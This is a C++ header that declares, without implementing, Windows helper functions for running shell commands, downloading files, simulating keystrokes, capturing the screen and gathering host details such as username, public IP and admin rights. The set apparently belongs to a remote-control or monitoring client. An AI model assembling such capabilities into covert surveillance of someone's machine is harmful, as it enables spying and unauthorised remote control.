#pragma once
#ifdef _DEBUG
#define PRINT_DEBUG_VALUE(v) std::cout << "Debug value " << #v << " " << v << std::endl;
#else
#define DEBUG(x)
#endif

#include <string>
#include <utility>
#include <vector>
#include <Windows.h>

#include <opencv2/opencv.hpp>
#include <nlohmann/json.hpp>


namespace tools {
	// do something
	std::string cmd_output(const char* cmd);
	bool filexists(const std::string& name);
	std::string random_string(int lenght);
	int ChangeVolume(double nVolume = -1, bool bScalar = 0);
	nlohmann::json load_cfg();
	void change_cfg(nlohmann::json change);
	void press_key(char a, bool is_bigone = 0);
	bool DownloadFile(std::string link, std::string path);
	std::string toLowerCase(std::string s);
	void pressSpecialKey(BYTE key, bool up);

	// get info
	char GetSysDiskLetter();
	std::string get_username();
	std::string get_exe();
	std::string hostname();
	std::string public_ip();
	std::string admin_rights();
	std::string Cursor_Position();
	std::string get_path();
	std::string uptime();
	std::string DiskList();
	std::vector<std::pair<std::string, std::string>> getLocalIp();
	bool is_path(const std::string& path);
	bool remove(const std::string& to_remove);

	// for screenshot function
	cv::Mat captureScreenMat(HWND hwnd);
}  // namespace tools
